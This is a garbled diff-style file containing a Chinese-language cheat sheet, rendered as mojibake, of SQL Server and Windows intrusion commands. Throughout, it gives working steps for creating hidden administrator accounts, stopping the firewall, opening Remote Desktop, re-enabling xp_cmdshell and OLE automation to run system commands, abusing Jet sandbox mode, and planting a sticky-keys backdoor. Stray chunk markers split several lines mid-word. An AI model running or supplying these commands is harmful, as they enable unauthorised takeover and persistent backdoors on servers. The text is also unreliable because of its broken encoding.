@@ -1,0 +1,533 @@
+f87
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+
+ÓÃCmdÌí¼ÓÒþ²ØÕË»§£º1,Ìí¼ÓÕË»§  2,ÕË»§ÌáÈ¨  3,Òþ²ØÕË»§  4,Òþ²ØÄ¿Â¼
+1: net user hacker$ 123 /add
+2: net localgroup administrators hacker$ /add
+3: REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v hacker$ /t REG_DWORD /d 0 /f
+4: ¢Ù cd\Documents and Settings\   ¢Ú md hacker$   ¢Û attrib +s +a +h +r hacker$
+
+net user guest /active       ¼¤»îguestÓÃ»§
+net localgroup administrators guest /add        ÌáÉý¹ÜÀíÔ±
+net localgroup "Remote Desktop Users" guest /add        Ìí¼Óµ½Ô¶³ÌµÇÂ½×é
+
+CmdÃüÁî£¬¹Ø·À»ðÇ½
+net stop sharedaccess
+
+CmdÃüÁî,¿ª3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+SqlÃüÁî,¿ª3389
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
+
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+
+Error Message:ÎÞ·¨×°ÔØ DLL xplog70.dll »ò¸Ã DLL ËùÒýÓÃµÄÄ³Ò» DLL¡£Ô­Òò: 126(ÕÒ²»µ½Ö¸¶¨µÄÄ£¿é¡£)¡£
+ÐÞ¸´XPLOG70.DLL£¨ÏÈÓÃÎÄ¼þ²é¿´ÏÂ±¸·ÝµÄÄ¿Â¼ÏÂ\x86\bin,È»ºó°ÑÏÂÃæÄ¿Â¼Ìæ»»£©
+µÚÒ»²½
+exec sp_dropextendedproc 'xp_cmdshell'
+µÚ¶þ²½
+dbcc addextendedproc ("xp_cmdshell","c:\sql2ksp4\x86\binn\xplog70.dll")
+
+Error Message:ÎÞ·¨ÔÚ¿â xpweb70.dll ÖÐÕÒµ½º¯Êý xp_cmdshell¡£Ô­Òò: 127(ÕÒ²»µ½Ö¸¶¨µÄ³ÌÐò¡£)¡£
+ÐÞ¸´·½·¨£º
+µÚÒ»²½
+exec sp_dropextendedproc 'xp_cmdshell'
+µÚ¶þ²½
+dbcc addextendedproc ("xp_cmdshell","c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll")
+;EXEC sp_configure   'show advanced options', 0 -- 
+
+
+ÐÞ¸´´íÎó£¬¾Ü¾ø·ÃÎÊµÄ·½·¨£º
+Net1
+Dir net.exe /s /p
+
+
+xp_cmdshellÐÂµÄ»Ö¸´°ì·¨ 
+µÚÒ»²½ÏÈÉ¾³ý£º
+drop procedure sp_addextendedproc 
+drop procedure sp_oacreate 
+exec sp_dropextendedproc 'xp_cmdshell' 
+·þÎñÆ÷: ÏûÏ¢ 3701£¬¼¶±ð 11£¬×´Ì¬ 5£¬ÐÐ 1
+µÚ¶þ²½»Ö¸´£º
+dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll") 
+Ö±½Ó»Ö¸´£¬²»¹Üsp_addextendedprocÊÇ²»ÊÇ´æÔÚ 
+
+
+Error Message:SQL Server ×èÖ¹ÁË¶Ô×é¼þ 'xp_cmdshell' µÄ ¹ý³Ì 'sys.xp_cmdshell' µÄ·ÃÎÊ£¬ÒòÎª´Ë×é¼þÒÑ×÷Îª´Ë·þÎñÆ÷°²È«ÅäÖÃµÄÒ»²¿·Ö¶ø±»¹Ø±Õ¡£ÏµÍ³¹ÜÀíÔ±¿ÉÒÔÍ¨¹ýÊ¹ÓÃ sp_configure ÆôÓÃ 'xp_cmdshell'¡£ÓÐ¹ØÆôÓÃ 'xp_cmdshell' µÄÏêÏ¸ÐÅÏ¢£¬Çë²ÎÔÄ SQL Server Áª»ú´ÔÊéÖÐµÄ "ÍâÎ§Ó¦ÓÃÅäÖÃÆ÷"¡£
+ÐÞ¸´·½·¨£º
+;EXEC sp_configure 'show advanced options', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure 'xp_cmdshell', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure   'show advanced options', 0 -- 
+
+
+Î´ÄÜÕÒµ½´æ´¢¹ý³Ì'master..xpcmdshell'.
+»Ö¸´·½·¨£º²éÑ¯·ÖÀëÆ÷Á¬½Óºó,
+µÚÒ»²½Ö´ÐÐ:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
+µÚ¶þ²½Ö´ÐÐ:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 
+
+
+Èç¹ûÒÔÉÏ·½·¨¾ù²»¿É»Ö¸´,Çë³¢ÊÔÓÃÏÂÃæµÄ°ì·¨Ö±½ÓÌí¼ÓÕÊ»§:
+2000servserÏµÍ³:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user ÐÂÓÃ»§ ÃÜÂë /add'
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators ÐÂÓÃ»§ /add'
+
+xp»ò2003serverÏµÍ³:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user ÐÂÓÃ»§ ÃÜÂë /add'
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators ÐÂÓÃ»§ /add' 
+
+¸ü¸Äsa¿ÚÁî·½·¨£º
+ÓÃsql×ÛºÏÀûÓÃ¹¤¾ßÁ¬½Óºó£¬Ö´ÐÐÃüÁî£º
+exec sp_password NULL,'ÐÂÃÜÂë','sa'
+
+¶ÂÉÏcmdshellµÄsqlÓï¾ä 
+sp_dropextendedproc "xp_cmdshell"
+
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+
+
+
+
+
+
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+»Ö¸´sp_addextendedprocÓï¾ä£º
+create procedure sp_addextendedproc 
+103f
+--- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call */
+@dllname varchar(255)/* name of DLL containing function */
+as
+set implicit_transactions off
+if @@trancount > 0
+begin
+raiserror(15002,-1,-1,'sp_addextendedproc')
+return (1)
+end
+dbcc addextendedproc( @functname, @dllname)
+return (0) -- sp_addextendedproc
+GO
+
+xp_cmdshellÐÂµÄ»Ö¸´°ì·¨(²»ÓÃÈ¥¹Üsp_addextendedprocÊÇ²»ÊÇ´æÔÚ)
+
+É¾³ý
+drop procedure sp_addextendedproc
+drop procedure sp_oacreate
+exec sp_dropextendedproc 'xp_cmdshell'
+
+»Ö¸´
+dbcc addextendedproc ("sp_oacreate","odsole70.dll")
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+net net1±»½ûÖ¹Ê±Ö´ÐÐCMDÃüÁî
+µÚÒ»²½£ºdir net.exe /s /p »òÕß dir net1.exe /s /p
+µÚ¶þ²½£ºC:\WINDOWS\system32\dllcache\net1.exe user 123 123 /add
+µÚÈý²½£ºC:\WINDOWS\system32\dllcache\net1.exe localgroup administrators 123 /add
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+É³ÅÌÄ£Ê½ÌáÈ¨
+sethc.exe½ûÖ¹
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cacls c:\windows\system32\net.exe /e /t /g everyone:F')
+net net1¶¼±»½ûÓÃ
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("xcopy taskmgr.exe sethc.exe /y")')
+Èç¹ûcmd±»½ûÓÃ
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("net user user pass /add")')
+
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+³ýÁËxplog70.dllÆäËûµÄ¶¼¿ÉÒÔÓÃÕâÃüÁîÐÞ¸´
+µÚÒ»²½ÏÈÉ¾³ý£º
+drop procedure sp_addextendedproc 
+drop procedure sp_oacreate 
+exec sp_dropextendedproc 'xp_cmdshell' 
+·þÎñÆ÷: ÏûÏ¢ 3701£¬¼¶±ð 11£¬×´Ì¬ 5£¬ÐÐ 1
+ÎÞ·¨ ³ýÈ¥ ¹ý³Ì 'sp_addextendedproc'£¬ÒòÎªËüÔÚÏµÍ³Ä¿Â¼ÖÐ²»´æÔÚ¡£
+·þÎñÆ÷: ÏûÏ¢ 3701£¬¼¶±ð 11£¬×´Ì¬ 5£¬¹ý³Ì sp_dropextendedproc£¬ÐÐ 18
+ÎÞ·¨ ³ýÈ¥ ¹ý³Ì 'xp_cmdshell'£¬ÒòÎªËüÔÚÏµÍ³Ä¿Â¼ÖÐ²»´æÔÚ¡£
+µÚ¶þ²½»Ö¸´£º
+dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll") 
+Ö±½Ó»Ö¸´£¬²»¹Üsp_addextendedprocÊÇ²»ÊÇ´æÔÚ 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+1.Î´ÄÜÕÒµ½´æ´¢¹ý³Ì'master..xpcmdshell'Ö®½â¾ö·½·¨£º
+EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int
+sp_addextendedproc 'xp_cmdshell','xpsql70.dll'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+»Ö¸´sp_addextendedprocÓï¾ä£º
+create procedure sp_addextendedproc --- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call */
+@dllname varchar(255)/* name of DLL containing function */
+as
+set implicit_transactions off
+if @@trancount > 0
+begin
+raiserror(15002,-1,-1,'sp_addextendedproc')
+return (1)
+end
+dbcc addextendedproc( @functname, @dllname)
+return (0) -- sp_addextendedproc
+GO
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+
+2 ÎÞ·¨×°ÔØ DLL xpsql70.dll »ò¸ÃDLLËùÒýÓÃµÄÄ³Ò»DLL¡£Ô­Òò126£¨ÕÒ²»µ½Ö¸¶¨Ä£¿é¡££©
+»Ö¸´·½·¨£º²éÑ¯·ÖÀëÆ÷Á¬½Óºó£¬
+sp_dropextendedproc "xp_cmdshell"
+sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+ÐÞ¸´XPLOG70.DLL£¨ÏÈÓÃÎÄ¼þ²é¿´ÏÂ±¸·ÝµÄÄ¿Â¼ÏÂ\x86\bin,È»ºó°ÑÏÂÃæÄ¿Â¼Ìæ»»£©
+µÚÒ»²½
+exec sp_dropextend edproc 'xp_cmdshell'
+µÚ¶þ²½
+dbcc addextendedproc ("xp_cmdshell","c:\sql2ksp4\x86\binn\xplog70.dll")
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+xplog70.dllÐÞ¸´£º
+Error Message:ÎÞ·¨×°ÔØ DLL xplog70.dll »ò¸Ã DLL ËùÒýÓÃµÄÄ³Ò» DLL¡£Ô­Òò: 126(ÕÒ²»µ½Ö¸¶¨µÄÄ£¿é¡£)¡£
+ÐÞ¸´XPLOG70.DLL£¨ÏÈÓÃÎÄ¼þ²é¿´ÏÂ±¸·ÝµÄÄ¿Â¼ÏÂ\x86\bin,È»ºó°ÑÏÂÃæÄ¿Â¼Ìæ»»£©
+µÚÒ»²½
+exec sp_dropextendedproc 'xp_cmdshell'
+µÚ¶þ²½
+dbcc addextendedproc ("xp_cmdshell","c:\sql2ksp4\x86\binn\xplog70.dll")
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+3.ÎÞ·¨ÔÚ¿â xpweb70.dll ÖÐÕÒµ½º¯Êý xp_cmdshell¡£Ô­Òò: 127(ÕÒ²»µ½Ö¸¶¨µÄ³ÌÐò¡£)
+exec sp_dropextendedproc 'xp_cmdshell'
+exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+4.Ö±½ÓÌí¼ÓÕÊ»§·¨
+É¾³ýodsole70.dll£º
+exec master..sp_dropextendedproc sp_oamethod
+exec master..sp_dropextendedproc sp_oacreate
+»Ö¸´odsole70.dll£º
+exec sp_addextendedproc sp_OAMethod,'odsole70.dll'   
+exec sp_addextendedproc sp_OACreate,'odsole70.dll'
+Ö±½ÓÌí¼ÓÕÊ»§ÃüÁî£º
+declare @shell int exec sp_oacreate 'wscript.shell',@shel
+103f
+l output exec sp_oamethod 
+@shell,'run',null,'c:\windows\system32\cmd.exe /c net user sqlmaster$ 123456 /add'
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe/c net localgroup administrators sqlmaster$ /add' 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+Cmd ÃüÁî¿ª3389£º
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+1.²éÑ¯ÖÕ¶Ë¶Ë¿Ú
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+
+2.¿ªÆôXP&2003ÖÕ¶Ë·þÎñ
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+3.¸ü¸ÄÖÕ¶Ë¶Ë¿ÚÎª2008(0x7d8)Ä¬ÈÏÎª3389£¨0xD3D£©
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f
+
+4.È¡Ïûxp&2003ÏµÍ³·À»ðÇ½¶ÔÖÕ¶Ë·þÎñµÄÏÞÖÆ¼°IPÁ¬½ÓµÄÏÞÖÆ
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f
+sqlÓï¾ä¿ª3389
+¿ª3389£º
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;-- 
+¹Ø3389£º
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSe t\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1; 
+²é¿´3389¶Ë¿Ú
+exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
+²é¿´ÏµÍ³°æ±¾
+type c:\boot.ini
+ÆÕÍ¨CMDºóÃÅ
+xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\taskmgr.exe'
+5ÏÂshiftºóÃÅÃüÁî
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+5.»Ö¸´Ê±Ò»Ð©³£ÓÃµÄSQLÓï¾ä£º
+ÀûÓÃsp_addextendedproc»Ö¸´´ó²¿·Ö³£ÓÃ´æ´¢À©Õ¹(µÃÏÈÀûÓÃ×î¶¥ÉÏµÄÓï¾ä»Ö¸´×Ô¼º)£º
+use master     
+exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'     
+exec sp_addextendedproc xp_dirtree,'xpstar.dll'     
+exec sp_addextendedproc xp_enumgroups,'xplog70.dll'     
+exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'     
+exec sp_addextendedproc xp_loginconfig,'xplog70.dll'     
+exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'     
+exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'     
+exec sp_addextendedproc sp_OACreate,'odsole70.dll'     
+exec sp_addextendedproc sp_OADestroy,'odsole70.dll'     
+exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'     
+exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'     
+exec sp_addextendedproc sp_OAMethod,'odsole70.dll'     
+exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'     
+exec sp_addextendedproc sp_OAStop,'odsole70.dll'     
+exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'     
+exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'     
+exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'     
+exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'     
+exec sp_addextendedproc xp_regread,'xpstar.dll'     
+exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'     
+exec sp_addextendedproc xp_regwrite,'xpstar.dll'     
+exec sp_addextendedproc xp_availablemedia,'xpstar.dll' 
+»Ö¸´cmdshell£º
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+1.sqlÃüÁî²éÑ¯×¢²á±íÕ³ÖÍ¼üÊÇ·ñ±»½Ù³Ö
+exec master..xp
+103f
+_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+2.sqlÃüÁî½Ù³Ö×¢²á±íÕ³ÖÍ¼ü¹¦ÄÜ,Ìæ»»³ÉÈÎÎñ¹ÜÀíÆ÷(µ±È»ÄãÒ²¿ÉÒÔÌæ»»³ÉÄãÏëÒªµÄÆäËûÃüÁî)
+xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', 
+'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
+3.sqlÃüÁîÉ¾³ý×¢²á±íÕ³ÖÍ¼üµÄ½Ù³Ö¹¦ÄÜ±£»¤ÄãµÄ·þÎñÆ÷²»ÔÙ±»ËûÈËÀûÓÃ
+xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+·ÖÎöÆ÷Ö´ÐÐµÄÓï¾ä£º
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+xpsql.cpp: ´íÎó 5 À´×Ô CreateProcess£¨µÚ 737 ÐÐ£© Ö±½Ó¼ÓÕÊºÅ£¡
+EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user admin$ admin /add")');
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators admin$ /add")');
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+»Ö¸´xp_cmdshell
+sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
+sp_addextendedproc 'xp_cmdshell','xplog70.dll'
+Ìí¼Ó´æ´¢¹ý³Ì
+sp_addextendedproc 'sp_oacreate','odsole70.dll
+sp_addextendedproc 'xp_lake2', 'd:\wwwroot\caoo\wwwroot\xplake2.dll'
+sp_dropextendedproc xp_lake2
+¼ÓÕËºÅ
+EXEC xp_lake2 'net user > d:\wwwroot\caoo\wwwroot\1.txt'
+EXEC  xp_lake2 'net user admin$ admin /add'
+EXEC xp_lake2 'net localgroup administrators admin$ /add'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+3389   SHIFTSAÉ³ºÐÄ£Ê½ÌáÈ¨-----
+----------------------
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
+-------------------------------------------------------
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user sqlmaster$ 123 /add")');
+-------------------------------------------------------
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators sqlmaster$ /add")');
+
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+ËÄ.ÖÕ¼«·½·¨£º
+Èç¹ûÒÔÉÏ·½·¨¾ù²»¿É»Ö¸´£¬Çë³¢ÊÔÓÃÏÂÃæµÄ°ì·¨Ö±½ÓÌí¼ÓÕÊ»§£º
+²éÑ¯·ÖÀëÆ÷Á¬½Óºó£¬
+2000servserÏµÍ³:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output
+exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user 123 123 /add'
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod
+@shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators 123 /add'
+xp»ò2003serverÏµÍ³:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod
+@shell,'run',null,'c:\windows\system32\cmd.exe /c net user 123 123 /add'
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod
+@shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 123 /add'
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin 1234 /add")')
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup administrators admin /add")')
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out 
+exec sp_oamethod @oo, 'copyfile',null,'c
+103f
+:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+sp_configure 'show advanced options', 1;
+GO
+RECONFIGURE;
+GO
+sp_configure 'Ole Automation Procedures', 1;
+GO
+RECONFIGURE;
+GO
+
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô ¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user'
+Ö´ÐÐSQLÓï¾äÊ±·¢Éú´íÎó£¡
+´í ÎóÃèÊö£ºSQL Server ×èÖ¹ÁË¶Ô×é¼þ 'Ole Automation Procedures' µÄ ¹ý³Ì'sys.sp_OACreate' µÄ·ÃÎÊ£¬ÒòÎª´Ë×é¼þÒÑ×÷Îª´Ë·þÎñÆ÷°²È«ÅäÖÃµÄÒ»²¿·Ö¶ø±»¹Ø±Õ¡£ÏµÍ³¹ÜÀíÔ±¿ÉÒÔÍ¨¹ýÊ¹ÓÃ sp_configure ÆôÓÃ 'Ole Automation Procedures'¡£ÓÐ¹ØÆôÓÃ 'Ole Automation Procedures' µÄÏêÏ¸ÐÅÏ¢£¬Çë²ÎÔÄ SQL Server Áª»ú´ÔÊéÖÐµÄ "ÍâÎ§Ó¦ÓÃÅäÖÃÆ÷"¡£ 
+exec master..sp_addextendedproc 'xp_cmdshell','xplog70.dll'--
+³É¹¦¡£
+ÔÙÖ´ÐÐSQLÓï¾ä
+[Microsoft][ODBC SQL Server Driver][SQL Server]ÔÚÖ´ÐÐ xp_cmdshell µÄ¹ý³ÌÖÐ³ö´í¡£µ÷ÓÃ 'CreateProcess' Ê§°Ü£¬´íÎó´úÂë: '5'¡£
+½â¾ö·½°¸:
+Óöµ½sql server 2005 £¬»Ö¸´xp_cmdshellµÄ°ì·¨ 
